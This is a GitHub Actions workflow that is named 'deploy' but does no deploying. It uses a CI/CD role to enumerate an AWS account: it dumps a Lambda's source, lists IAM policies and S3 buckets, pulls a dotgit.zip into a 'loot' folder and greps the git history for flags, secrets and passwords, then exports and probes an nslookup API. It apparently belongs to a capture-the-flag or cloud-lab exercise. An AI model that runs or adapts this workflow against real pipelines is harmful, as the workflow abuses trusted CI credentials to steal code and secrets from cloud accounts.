name: deploy

on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: |
          aws sts get-caller-identity

      - name: Lambda information
        run: |
          echo "===== LAMBDA CONFIG ====="
          aws lambda get-function-configuration \
            --function-name nslookupv2

      - name: Download Lambda code
        run: |
          echo "===== DOWNLOAD LAMBDA ====="

          aws lambda get-function \
            --function-name nslookupv2 \
            --query 'Code.Location' \
            --output text > lambda_url

          mkdir lambda

          curl -L "$(cat lambda_url)" -o lambda.zip

          unzip -o lambda.zip -d lambda

          echo "===== FILES ====="
          find lambda -type f

          echo "===== CODE ====="
          cat lambda/lambda_function.py

      - name: Lambda role permissions
        run: |
          echo "===== ROLE POLICIES ====="

          aws iam list-attached-role-policies \
            --role-name lambdaRole || true

          aws iam list-role-policies \
            --role-name lambdaRole || true

      - name: S3 enumeration
        run: |
          echo "===== BUCKETS ====="
          aws s3 ls

          echo "===== CODE BUCKET ====="
          aws s3 ls s3://codec4f26c862a321ef5/ || true

          echo "===== PLATFORM BUCKET ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true

      - name: Download dotgit
        run: |
          mkdir -p loot

          aws s3 cp \
            s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
            loot/dotgit.zip

          unzip -o loot/dotgit.zip -d loot

          echo "===== GIT HISTORY ====="

          cd loot/dotgit

          git log --oneline --all

          git grep -nEi "flag|secret|lambda|s3|api|key|password" $(git rev-list --all) || true

      - name: API Gateway export
        run: |
          echo "===== API EXPORT ====="

          aws apigateway get-export \
            --rest-api-id 3q931syi7b \
            --stage-name dev \
            --export-type oas30 \
            api.json || true

          cat api.json || true

      - name: Test API
        run: |
          echo "===== API TEST ====="

          curl -i -X POST \
          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
          -H "Content-Type: application/json" \
          -d '{"domain":"example.com"}'
